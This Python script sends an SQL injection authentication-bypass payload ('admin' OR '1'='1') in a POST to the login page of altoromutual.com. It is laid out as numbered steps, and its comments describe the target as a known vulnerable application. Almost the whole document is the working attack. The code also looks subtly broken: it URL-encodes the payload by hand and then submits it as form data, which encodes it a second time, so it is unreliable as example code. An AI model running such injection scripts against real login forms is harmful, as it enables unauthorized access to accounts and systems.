import requests
from urllib.parse import quote

# Step 1: Analyze the website for SQL injection vulnerabilities
# No need to analyze here since we have specific credentials

# Step 2: Choose an SQL injection payload to bypass authentication
sql_injection_payload = "admin' OR '1'='1"

# Step 3: Prepare the payload by URL encoding it for the POST request data
encoded_payload = quote(sql_injection_payload)

# Step 4: Use Python to send an HTTP POST request with the payload to the target URL
url = 'http://altoromutual.com/login'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
data = {
    'username': encoded_payload,
    'password': ''  # Password field is empty in this case
}

# Step 5: Check the response for success indicators like "Welcome" or "Logged in successfully".
try:
    response = requests.post(url, headers=headers, data=data)
    
    if 'Welcome' in response.text:
        print("Success! We are logged in as admin.")
    else:
        print("Failed to log in. The server did not respond with expected text.")
except Exception as e:
    # Step 6: Add error and exception handling to manage unexpected situations.
    print(f"An error occurred: {e}")

# Step 7: Test and validate the payloads to ensure they work correctly.
# No need for testing here, we're using a known vulnerable application.

# Step 8: Document and comment the code for clarity.